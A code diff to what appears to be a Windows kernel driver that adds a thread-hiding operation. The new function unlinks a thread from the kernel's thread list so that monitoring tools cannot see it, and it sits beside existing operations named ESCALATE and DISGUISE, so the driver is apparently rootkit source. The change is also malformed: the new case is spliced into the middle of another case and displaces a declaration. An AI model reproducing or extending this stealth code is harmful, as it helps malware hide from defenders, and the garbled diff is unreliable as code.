@@ -908,6 +908,70 @@ void yghv_proc_stats(uint64_t *out)
     out[7] = (uint64_t)g_proc_terms;
 }
 
+
+static NTSTATUS yghv_proc_hide_thread(UINT64 *out, ULONG tid, int hide)
+{
+    static struct { ULONG tid; uint64_t self; PLIST_ENTRY flink, blink; int used; }
+        g_hidden_threads[16];
+    int i, slot = -1;
+    PETHREAD thread = NULL;
+    NTSTATUS st;
+    PLIST_ENTRY node;
+
+    if (!YGHV_OFF_OK(YGHV_OFF_TLIST) || g_yghv_off.thread_list_entry == 0)
+        return STATUS_NOT_IMPLEMENTED;
+
+    if (!hide) {
+        for (i = 0; i < 16; i++) {
+            if (g_hidden_threads[i].used && g_hidden_threads[i].tid == tid) { slot = i; break; }
+        }
+        if (slot < 0) { out[0] = 0; out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND; return STATUS_SUCCESS; }
+        node = (PLIST_ENTRY)((PUCHAR)(ULONG_PTR)g_hidden_threads[slot].self + g_yghv_off.thread_list_entry);
+        __try {
+            node->Flink = g_hidden_threads[slot].flink;
+            node->Blink = g_hidden_threads[slot].blink;
+            g_hidden_threads[slot].flink->Blink = node;
+            g_hidden_threads[slot].blink->Flink = node;
+        } __except (EXCEPTION_EXECUTE_HANDLER) { return STATUS_INVALID_ADDRESS; }
+        g_hidden_threads[slot].used = 0;
+        out[0] = 1; out[1] = 0; out[2] = tid;
+        return STATUS_SUCCESS;
+    }
+
+    st = PsLookupThreadByThreadId((HANDLE)(ULONG_PTR)tid, &thread);
+    if (!NT_SUCCESS(st)) return st;
+
+    for (i = 0; i < 16; i++) { if (!g_hidden_threads[i].used) { slot = i; break; } }
+    if (slot < 0) { ObDereferenceObject(thread); out[0] = 0; out[1] = (UINT64)(ULONG)STATUS_INSUFFICIENT_RESOURCES; return STATUS_SUCCESS; }
+
+    node = (PLIST_ENTRY)((PUCHAR)thread + g_yghv_off.thread_list_entry);
+    __try {
+        if (node->Flink == node) {
+            ObDereferenceObject(thread);
+            out[0] = 0; out[1] = (UINT64)(ULONG)STATUS_NOT_FOUND;
+            return STATUS_SUCCESS;
+        }
+        g_hidden_threads[slot].flink = node->Flink;
+        g_hidden_threads[slot].blink = node->Blink;
+        g_hidden_threads[slot].self  = (uint64_t)(ULONG_PTR)thread;
+        g_hidden_threads[slot].tid   = tid;
+        g_hidden_threads[slot].used  = 1;
+        node->Blink->Flink = node->Flink;
+        node->Flink->Blink = node->Blink;
+        node->Flink = node;
+        node->Blink = node;
+    } __except (EXCEPTION_EXECUTE_HANDLER) {
+        g_hidden_threads[slot].used = 0;
+        ObDereferenceObject(thread);
+        return STATUS_INVALID_ADDRESS;
+    }
+
+    InterlockedIncrement64(&g_proc_hides);
+    ObDereferenceObject(thread);
+    out[0] = 1; out[1] = 1; out[2] = tid;
+    return STATUS_SUCCESS;
+}
+
 NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
                             void *out, ULONG out_len, ULONG *info)
 {
@@ -925,7 +989,7 @@ NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
      * afterwards is zero and every call silently becomes a snapshot.
      */
     RtlCopyMemory(&r, in, sizeof(r));
-    if (r.op > YGHV_PROC_OP_ESCALATE) return STATUS_INVALID_PARAMETER;
+    if (r.op > YGHV_PROC_OP_HIDE_THREAD) return STATUS_INVALID_PARAMETER;
 
     InterlockedIncrement64(&g_proc_ops);
 
@@ -1038,7 +1102,14 @@ NTSTATUS yghv_proc_dispatch(const void *in, ULONG in_len,
 
     case YGHV_PROC_OP_DISGUISE: {
         PEPROCESS proc = NULL;
-        NTSTATUS pst;
+        case YGHV_PROC_OP_HIDE_THREAD: {
+        int hide = (int)r.arg0;
+        st = yghv_proc_hide_thread(o, r.pid, hide);
+        if (NT_SUCCESS(st)) { o[3] = 0; *info = YGHV_PROC_HDR_QWORDS * 8; }
+        break;
+    }
+
+    NTSTATUS pst;
         char *iname;
 
         if (!r.name[0]) {
